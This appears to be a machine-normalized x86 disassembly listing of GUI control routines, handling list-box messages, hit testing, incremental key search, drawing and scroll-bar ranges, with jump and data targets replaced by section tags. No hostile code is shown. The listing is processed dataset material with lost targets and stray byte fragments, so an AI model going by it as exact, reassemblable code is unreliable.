call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404074
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_404534
mov edx eax
mov eax [ esi + 0x8 ]
call sub_408730
mov eax [ ebp - 0x4 ]
call sub_404334
mov [ esi + 0xc ] eax
jmp r-xdata
sub_435d84
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_435e1a
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435e21
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404074
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_404334
mov [ esi + 0xc ] eax
jmp r-xdata
sub_435e3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_435cb4
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push esi
push 0x197
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
sub_435e68
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub al 0x3
je r-xdata
xor edx edx
mov eax ebx
call sub_435c78
jmp r-xdata
dec al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_435c78
jmp r-xdata
sub_435eac
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x20 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x20 ]
push eax
call PtInRect
test eax eax
je r-xdata
or ebp 0xffffffff
mov eax esi
call sub_435cb4
mov ebp eax
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
cmp edi ebp
jle r-xdata
test bl bl
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx ebp
mov edx 0x198
mov eax esi
call sub_43efc4
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax ebp
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
cmp edi ebp
jg r-xdata
sub_435f38
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test ebx ebx
je r-xdata
push edi
mov ecx ebx
mov edx 0x198
mov eax esi
call sub_43efc4
jmp r-xdata
cmp eax ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
cmp eax ebx
jne r-xdata
mov eax edi
xor ecx ecx
mov edx 0x10
call sub_402cbc
push edi
mov ecx ebx
dec ecx
mov edx 0x198
mov eax esi
call sub_43efc4
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
push 0x0
push edi
call OffsetRect
jmp r-xdata
sub_435f9c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_441484
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_4413b0
mov esi rw-data
cmp [ ebx + 0x23b ] 0x0
je r-xdata
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
setb dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
or edx 0x300000
or edx 0x1
or edx [ edi + 0x4 ]
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x23a ]
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x208 ]
or edx [ esi + eax * 4 ]
xor eax eax
mov al [ ebx + 0x239 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x22c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x224 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x23c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
mov [ edi + 0x4 ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov esi rw-data
mov eax ebx
mov si 0xffc8
call sub_40349c
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or eax 0x1
not eax
and [ edi + 0x24 ] eax
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
and [ edi + 0x4 ] 0xff7fffff
or [ edi + 0x8 ] 0x200
sub_4360b4
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x48 ]
mov edi [ ebx + 0x4c ]
mov eax ebx
call sub_4415b0
push 0x14
push edi
push esi
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push 0x0
mov eax ebx
call sub_4445f8
push eax
call SetWindowPos
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax ebx
call sub_435940
mov eax [ ebx + 0x234 ]
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebx + 0x23c ]
push eax
push 0x1
push 0x192
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
mov dl [ ebx + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
cmp [ ebx + 0x240 ] 0x0
je r-xdata
mov esi [ ebx + 0x240 ]
test esi esi
je r-xdata
mov edx eax
mov eax ebx
call sub_436a7c
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x244 ]
mov eax ebx
call sub_435e3c
mov edx [ ebx + 0x248 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov [ ebx + 0x234 ] 0xffffffff
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebx + 0x240 ]
call sub_40d01c
sub_436184
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_441994
pop esi
pop ebx
retn
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov esi eax
mov [ ebx + 0x240 ] esi
mov edx [ ebx + 0x218 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x234 ] eax
jmp r-xdata
mov eax ebx
call sub_435cb4
mov [ ebx + 0x244 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x248 ] eax
sub_436200
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax ebx
call sub_44200c
mov edi [ esi ]
cmp edi 0x201
je r-xdata
mov eax ebx
call sub_43e580
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_441f78
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
sub_436266
add [ eax ] al
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi edx
mov esi eax
mov ax [ edi + 0x4 ]
call sub_4550f8
mov ebx eax
cmp [ esi + 0x5d ] 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_43f494
cmp [ esi + 0x5d ] 0x1
jne r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x208 ] 0x0
je r-xdata
test bl 0x1
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_43e4b8
test bl 0x4
jne r-xdata
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406b0c
mov edx esp
mov cl 0x1
mov eax esi
call sub_435eac
mov ebp eax
test ebp ebp
jl r-xdata
test bl 0x4
je r-xdata
test bl 0x1
jne r-xdata
mov edx ebp
mov eax esi
call sub_435b54
test al al
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_43e4b8
jmp r-xdata
sub_436304
push esi
mov esi eax
mov ax [ edx + 0x6 ]
dec ax
je r-xdata
mov eax esi
call sub_43da04
mov eax esi
mov si 0xffeb
call sub_40349c
pop esi
retn
dec ax
je r-xdata
mov eax esi
mov si 0xffe9
call sub_40349c
jmp r-xdata
pop esi
retn
sub_436338
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov [ ebp - 0x18 ] 0xbc2b
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x10 ] eax
mov eax [ edi ]
call sub_4445f8
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x58 ] 0x2
mov [ ebp - 0x4c ] 0x1
xor eax eax
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x40 ] eax
mov eax [ edi ]
call sub_4445f8
mov [ ebp - 0x54 ] eax
mov eax [ edi ]
call sub_4445f8
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x28 ] 0xbc2c
mov eax [ edi ]
call sub_4445f8
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x70 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x70 ] 0x2
mov eax [ edi ]
call sub_4445f8
mov [ ebp - 0x6c ] eax
xor esi esi
mov eax [ edi ]
call sub_435cb4
mov ebx eax
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call GetClipBox
mov eax [ edi ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
cmp esi [ ebp - 0x4 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x68 ] ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x64 ] eax
mov eax [ edi ]
mov eax [ eax + 0x230 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x50 ] ebx
lea edx [ ebp - 0x28 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov eax [ ebp - 0x60 ]
add eax esi
push eax
lea eax [ ebp - 0x90 ]
push eax
mov ecx [ ebp - 0x64 ]
mov edx esi
xor eax eax
call sub_4129b0
push esi
push edi
lea esi [ ebp - 0x90 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea edx [ ebp - 0x18 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
add esi [ ebp - 0x60 ]
inc ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x5c ] eax
cmp esi [ ebp - 0x4 ]
jl r-xdata
sub_436498
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_442788
push ebp
call sub_436338
pop ecx
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_4364dc
push ebx
add esp 0xffffffe0
mov ebx eax
mov [ esp + 0x8 ] 0x201
push esp
call GetCursorPos
lea ecx [ esp + 0x18 ]
mov edx esp
mov eax ebx
call sub_43d93c
lea eax [ esp + 0x18 ]
call sub_406b20
mov [ esp + 0x10 ] eax
xor eax eax
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x14 ] eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov [ esp + 0x8 ] 0x202
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x20
pop ebx
retn
sub_43653c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_436648
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x252 ] 0x0
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x228 ]
call sub_41dfc4
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp edi eax
jge r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43664f
lea eax [ ebp - 0x8 ]
call sub_404074
retn
mov edx 0x824
mov eax ebx
call sub_4400f0
mov [ ebp - 0x4 ] eax
mov eax ebx
mov si 0xffc8
call sub_40349c
test al al
jne r-xdata
sub [ ebp - 0x10 ] 0x2
add [ ebp - 0x18 ] 0x2
jmp r-xdata
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_436b60
jmp r-xdata
lea eax [ ebp - 0x8 ]
call sub_404074
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404334
push eax
mov eax [ ebp - 0x8 ]
call sub_404534
push eax
mov eax [ ebx + 0x228 ]
call sub_41e4e4
push eax
call DrawTextA
sub_436678
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi [ edx + 0x8 ]
mov bp [ edi + 0x10 ]
mov edx [ edi + 0x18 ]
mov eax [ esi + 0x228 ]
call sub_41e564
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x228 ]
call sub_41e3e0
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x228 ]
call sub_41e3fc
cmp [ edi + 0x8 ] 0x0
jl r-xdata
cmp [ edi + 0x8 ] 0x0
jl r-xdata
test bp 0x1
je r-xdata
lea edx [ edi + 0x1c ]
mov eax [ esi + 0x228 ]
call sub_41dfc4
push ebp
lea ecx [ edi + 0x1c ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf8 ]
jmp r-xdata
mov eax [ esi + 0x228 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41dbec
mov eax [ esi + 0x228 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41d400
xor edx edx
mov eax [ esi + 0x228 ]
call sub_41e564
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ edi + 0x1c ]
push eax
mov eax [ edi + 0x18 ]
push eax
call DrawFocusRect
test bp 0x10
je r-xdata
sub_436734
push ebx
push esi
push edi
mov esi eax
mov edi [ edx + 0x8 ]
mov eax [ esi + 0x230 ]
mov [ edi + 0x10 ] eax
cmp [ esi + 0x238 ] 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ edi + 0x10 ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xfc ]
sub_436764
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_443c10
pop esi
pop ebx
retn
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
mov eax ebx
call sub_441b98
sub_436790
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
mov cl 0x1
mov edx edi
mov eax esi
call sub_435ba4
inc edi
dec ebx
jne r-xdata
sub_4367c8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_404534
push eax
push 0xffffffff
push 0x18f
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4445f8
push eax
call SendMessageA
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_436ba8
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax ]
sub al 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x208 ] 0x0
je r-xdata
cmp ebx 0xffffffff
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub al 0x5
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffeb
call sub_40349c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov esi ebx
mov edx esi
mov eax esi
call sub_406b40
push eax
push 0x1
push 0x19b
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4445f8
push eax
call SendMessageA
sub al 0xe
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax ] 0x0
sub_4368ac
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_436a6c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_4435dc
mov eax [ ebx ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436a73
lea eax [ ebp - 0x30 ]
mov edx 0x3
call sub_404098
retn
call GetTickCount
mov edx [ ebx ]
sub eax [ edx + 0x220 ]
cmp eax 0x1f4
jb r-xdata
call GetTickCount
mov edx [ ebx ]
mov [ edx + 0x220 ] eax
mov eax [ ebp - 0x8 ]
mov al [ eax ]
cmp al 0x8
je r-xdata
mov eax [ ebx ]
add eax 0x21c
call sub_404074
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_404334
mov edx eax
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_40bff0
cmp al 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_404334
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_4045d4
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_404334
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_4045d4
lea eax [ ebp - 0x30 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_40425c
mov edx [ ebp - 0x30 ]
mov eax [ ebx ]
add eax 0x21c
call sub_40433c
jmp r-xdata
push 0x1
push 0x102
push 0x102
mov eax [ ebx ]
call sub_4445f8
push eax
lea eax [ ebp - 0x24 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
xor edx edx
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebx ]
mov si 0xffeb
call sub_40349c
push ebp
call sub_4367c8
pop ecx
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_404334
test eax eax
jle r-xdata
mov eax [ ebx ]
push [ eax + 0x21c ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_40425c
push [ ebp - 0x28 ]
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0x1c ]
call sub_40425c
push [ ebp - 0x2c ]
mov eax [ ebx ]
add eax 0x21c
mov edx 0x3
call sub_4043f4
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
sub_436a7c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_436b50
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
call sub_403a2c
push 0x0
push esi
push 0x1a7
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
call sub_403a2c
jmp r-xdata
cmp eax 0xfffffffe
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436b57
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404098
retn
mov [ ebx + 0x214 ] esi
jmp r-xdata
sub_436b80
push ebx
push ecx
cmp [ eax + 0x272 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_436ba8
push ebx
cmp [ eax + 0x26a ] 0x0
je r-xdata
or eax 0xffffffff
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
pop ebx
retn
sub_436bcc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440324
mov edx 0x79
mov eax esi
call sub_43d5b4
push 0x3
call GetSystemMetrics
mov edx eax
mov eax esi
call sub_43d5d8
mov dl 0x1
mov eax esi
call sub_44482c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x208 ] 0x0
xor eax eax
mov [ esi + 0x20c ] eax
xor eax eax
mov [ esi + 0x210 ] eax
mov [ esi + 0x214 ] 0x64
mov [ esi + 0x220 ] 0x1
mov [ esi + 0x222 ] 0x1
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_436c84
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_441484
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_4413b0
xor eax eax
mov al [ ebx + 0x208 ]
mov eax [ eax * 4 + rw-data ]
or [ edi + 0x4 ] eax
cmp [ ebx + 0x208 ] 0x1
jne r-xdata
mov eax ebx
call sub_436dc4
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_40349c
test al al
jne r-xdata
mov [ ebx + 0x21c ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
jmp r-xdata
or [ edi + 0x4 ] 0x2
or [ edi + 0x4 ] 0x4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_436d14
call sub_43d798
mov eax ebx
call sub_4415b0
lea edx [ esp + 0x1c ]
mov eax ebx
call sub_43d7b8
push 0x0
mov eax [ ebx + 0x214 ]
push eax
mov eax [ ebx + 0x210 ]
push eax
push 0x2
mov eax ebx
call sub_4445f8
push eax
call SetScrollRange
mov [ esp ] 0x1c
mov eax [ ebx + 0x218 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x4 ] 0x2
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_4445f8
push eax
call SetScrollInfo
mov eax ebx
call sub_436dc4
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_4445f8
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_4445f8
push eax
call SetScrollPos
jmp r-xdata
add esp 0x2c
pop ebx
retn
sub_436dc4
push ebx
mov ebx eax
mov eax ebx
call sub_43e43c
test al al
je r-xdata
mov al 0x1
pop ebx
retn
cmp [ ebx + 0x208 ] 0x1
je r-xdata
xor eax eax
pop ebx
retn
sub_436de4
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] dl
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
call sub_441b98
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
sub_436e20
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_436f57
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebp - 0x4 ]
jl r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
cmp esi [ ebx + 0x218 ]
jge r-xdata
cmp esi edi
jge r-xdata
mov edi [ ebp - 0x4 ]
cmp edi [ ebp - 0x4 ]
jge r-xdata
mov eax [ ebx + 0x210 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edi esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x210 ] eax
mov [ ebx + 0x214 ] esi
mov eax ebx
call sub_4448fc
test al al
je r-xdata
cmp esi [ ebx + 0x214 ]
je r-xdata
cmp edi [ ebx + 0x20c ]
je r-xdata
cmp edi [ ebx + 0x20c ]
sete al
neg al
sbb eax eax
push eax
push esi
mov eax [ ebp - 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_4445f8
push eax
call SetScrollRange
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436f5e
lea eax [ ebp - 0x8 ]
call sub_404074
retn
